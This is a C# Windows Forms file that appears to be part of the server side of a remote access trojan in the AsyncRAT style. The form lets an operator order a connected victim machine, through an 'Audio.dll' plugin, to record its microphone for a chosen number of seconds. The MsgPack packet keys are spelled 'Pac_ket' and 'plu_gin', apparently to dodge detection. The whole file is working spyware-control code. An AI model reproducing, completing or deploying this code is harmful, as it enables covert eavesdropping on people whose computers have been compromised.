using System;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
    public partial class FormAudio : Form
    {
        private SoundPlayer SP = new SoundPlayer();

        public FormAudio()
        {
            InitializeComponent();
            MinimizeBox = false;
            MaximizeBox = false;
        }

        public Form1 F { get; set; }
        internal Clients ParentClient { get; set; }
        internal Clients Client { get; set; }

        public byte[] BytesToPlay { get; set; }

        //Start or stop audio recording
        private void btnStartStopRecord_Click(object sender, EventArgs e)
        {
            if (textBox1.Text != null)
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "audio";
                packet.ForcePathObject("Second").AsString = textBox1.Text;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Audio.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                Thread.Sleep(100);
                btnStartStopRecord.Text = "Wait...";
                btnStartStopRecord.Enabled = false;
            }
            else
            {
                MessageBox.Show("Input seconds to record.");
            }
        }

        //Start or stop audio playback

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected) Close();
            }
            catch
            {
                Close();
            }
        }
    }
}